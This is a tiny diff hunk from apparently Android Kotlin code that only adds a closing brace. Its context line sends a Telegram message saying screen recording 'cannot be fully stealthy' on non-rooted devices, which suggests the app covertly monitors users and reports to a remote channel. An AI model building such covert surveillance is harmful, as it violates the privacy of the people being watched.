@@ -308,7 +308,7 @@ CoroutineScope(Dispatchers.IO).launch {
     sendTelegramMessage        
 ("Screen recording requires user interaction on non-rooted device. Cannot be fully stealthy.")
 }
-
+    }
 
         
 
